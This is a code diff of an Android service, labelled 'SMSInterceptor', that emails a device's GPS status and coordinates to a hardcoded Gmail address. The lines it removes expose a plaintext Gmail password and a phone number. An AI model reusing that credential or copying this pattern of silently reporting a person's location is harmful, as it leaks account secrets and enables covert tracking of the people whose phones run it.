@@ -29,14 +29,11 @@ public class SMSService extends Service implements LocationListener {
 
   private static GmailSender sender;
 
-  public static String gmailEmailString    = "justdriveapp1@gmail.com";
-  public static String phoneNumberString   = "2014640695";
-  public static String gmailPasswordString = "GHOST21ghost";
-
   private static boolean eLocation = false;
   private static boolean mLocation = false;
 
   private static LocationManager locationManager;
+  private static String gmailEmailString = "justdriveapp1@gmail.com";
 
   final Messenger mMessenger = new Messenger(new IncomingHandler());
 
@@ -64,7 +61,8 @@ public class SMSService extends Service implements LocationListener {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString);
+          //sender.sendMail("SMSInterceptor", "GPS has been 'DIS'abled!", gmailEmailString, gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -86,7 +84,7 @@ public class SMSService extends Service implements LocationListener {
       public void run() {
         try {
           sender = new GmailSender();
-          sender.sendMail("SMSInterceptor", "GPS has been 'EN'abled!", gmailEmailString, gmailEmailString);
+          sender.sendMail("SMSInterceptor", "GPS has been 'EN'abled!", gmailEmailString);
         }
         catch(Exception e) {
           e.printStackTrace();
@@ -112,7 +110,7 @@ public class SMSService extends Service implements LocationListener {
           try {
             sender = new GmailSender();
             sender.sendMail("SMSInterceptor", "Location!\nlatitude-longitude coordinates:\n" +
-            "" + latitude + "," + longitude, gmailEmailString, gmailEmailString);
+            "" + latitude + "," + longitude, gmailEmailString);
           }
           catch(Exception e) {
             e.printStackTrace();
@@ -150,7 +148,7 @@ public class SMSService extends Service implements LocationListener {
             public void run() {
               try {
                 sender = new GmailSender();
-                sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString, gmailEmailString);
+                sender.sendMail("SMSInterceptor", "GPS is not enabled. Cannot obtain location.", gmailEmailString);
               }
               catch(Exception e) {
                 e.printStackTrace();
